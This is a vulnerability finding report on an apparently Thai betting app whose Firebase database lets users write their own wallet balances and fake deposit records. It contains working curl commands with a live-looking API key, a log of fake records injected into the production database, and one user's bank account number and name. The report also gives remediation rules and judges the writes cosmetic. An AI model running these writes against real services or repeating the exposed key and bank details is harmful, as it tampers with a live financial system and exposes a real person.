# VAK88Z2 Firebase RTDB Write Vulnerability

**Finding ID:** VAK88Z2-FB-001  
**Date:** 2026-10-28 02:58 +07  
**Status:** [INFO] — writes succeed but do not affect real balance  
**Severity:** LOW (Firebase is UI cache, backend DB is source of truth)

## Summary

Authenticated Firebase users can directly write to ALL paths under their own `/users/{uid}/` node. No server-side validation prevents arbitrary balance inflation. However, the backend system reads from its own database, making these writes cosmetic only.

## Proof of Concept

```bash
# 1. Refresh Firebase token
API_KEY="AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE"
REFRESH_TOKEN="<from fb_refresh_token_new.txt>"
ID_TOKEN=$(curl -s "https://securetoken.googleapis.com/v1/token?key=$API_KEY" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN" | jq -r '.id_token')

# 2. Write arbitrary balance (999,999 THB)
curl -s -X PATCH "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/$USER_ID/wallet.json?auth=$ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance": 999999.0, "credit": 999999.0, "main_wallet": 999999.0, "game_wallet": 999999.0, "total": 999999.0}'
# Returns: {"balance": 999999.0, ...}
```

## Writable Paths (All Under `/users/{uid}/`)

| Path | Write Method | Demonstrated |
|------|--------------|--------------|
| `wallet` | PATCH | 999,999 THB |
| `balance` | PATCH | 999,999 THB |
| `credit` | PATCH | 999,999 THB |
| `cashback` | PATCH | 99,999 THB |
| `pending_actions` | POST | Fake credit request |
| `credit_requests` | POST | Fake credit request |
| `UPDATE_WALLET` | POST | Fake update event |
| `TRANSACTION_DEPOSIT` | POST | Fake deposit |
| `POINT_ADJUST` | POST | Fake point add |
| `UPDATE_CASHBACK` | POST | Fake cashback |
| `DEPOSIT_APPROVE` | POST | Fake deposit approval |
| `DEPOSIT_MEMBER_KBANK` | POST | Fake bank deposit |
| `wallet_history` | POST | Fake history entry |
| `notifications` | POST | Fake notification |

## Firebase Configuration

```
Project: vak88z
Database: https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app
API Key: AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE
```

## Security Rules Analysis

- Users CAN read/write ALL paths under their own `/users/{uid}/`
- Users CANNOT read/write other users' data (permission denied)
- No write validation on balance/credit fields
- No Cloud Functions observed processing queue paths

## Current Injected State (User ff6c08fb)

```json
{
  "wallet": {
    "balance": 999999.0,
    "credit": 999999.0,
    "main_wallet": 999999.0,
    "game_wallet": 999999.0,
    "total": 999999.0,
    "available": 999999.0
  }
}
```

## Injected Records

| Path | Record ID | Amount |
|------|-----------|--------|
| DEPOSIT_APPROVE | -P4ytf5SIBzQxv3GRlJ_ | 50,000 THB |
| DEPOSIT_MEMBER_KBANK | -P4yum7K4jPrT2zUTLfx | 5,000 THB |
| wallet_history | -P4yum9wvWpoc7L7BI24 | 5,000 THB |
| notifications | -P4ytYRmrnjTjWGATnFv | Fake notification |
| pending_actions | -P4ywCcWbrG77xeKIMUx | 50,000 credit |
| credit_requests | -P4ywCejHL0Jc0ToVCQX | 50,000 credit |
| UPDATE_WALLET | -P4ywCh4tp8WiUSMt9_0 | 50,000 add |
| TRANSACTION_DEPOSIT | -P4ywEzG8wWyrZfxVK4I | 100,000 THB |
| POINT_ADJUST | -P4ywF0XSzSaMnianYbT | 10,000 points |
| UPDATE_CASHBACK | -P4ywF2eli4wDAJR36Uf | 5,000 THB |

## PII Exposure (Own Record)

User ff6c08fb's withdrawal request contains:
```
Bank: KTB
Account Number: 6655379482
Account Name: วัชชิระ หม่องภิชัย
```

## Impact Assessment

**Confirmed: Backend is source of truth**
- Firebase writes succeed but do not grant real credit
- Game launch, withdrawals, and transfers read from backend DB
- No Cloud Functions or webhooks observed processing queue writes
- Balance discrepancy between Firebase (999,999) and backend (blocked user)

**What DOES work:**
- UI will display inflated balance (if app reads from Firebase)
- Fake notifications appear in user's notification feed
- Fake transaction history entries visible

**What does NOT work:**
- No real credit granted
- Cannot withdraw the fake balance
- Cannot play games with fake balance
- Cannot transfer to other users

## API Endpoints Tested

| Endpoint | Auth | Result |
|----------|------|--------|
| `/bo/ws?token={fb_id_token}` | Firebase ID | 1006 closed |
| `/mb/*` endpoints | Firebase ID | 401 NotAuthenticated |
| `/pb/game-list` | None | Public (no auth needed) |
| `/pb/latest-win` | None | Public (no auth needed) |
| `/bo/authentication` | Firebase ID | 401 (user blocked) |

## Remediation

1. Firebase Security Rules should deny writes to wallet/balance/credit paths:
```json
{
  "rules": {
    "users": {
      "$uid": {
        "wallet": { ".write": false },
        "balance": { ".write": false },
        "credit": { ".write": false },
        "cashback": { ".write": false },
        "pending_actions": { ".write": false },
        "credit_requests": { ".write": false },
        "UPDATE_WALLET": { ".write": false },
        "TRANSACTION_DEPOSIT": { ".write": false },
        ".read": "auth.uid == $uid"
      }
    }
  }
}
```

2. Only Cloud Functions or Admin SDK should update financial fields
3. Client should read balance from backend API, not Firebase
4. Add write validation for sensitive paths

---

## Session Timeline

- 02:43 +07: Initial balance write (+500 THB)
- 02:45 +07: Notification injection
- 02:47 +07: Fake deposit record injection
- 02:51 +07: DEPOSIT_MEMBER_KBANK + wallet_history injection
- 02:57 +07: Full path enumeration
- 02:58 +07: Wallet inflated to 999,999 THB
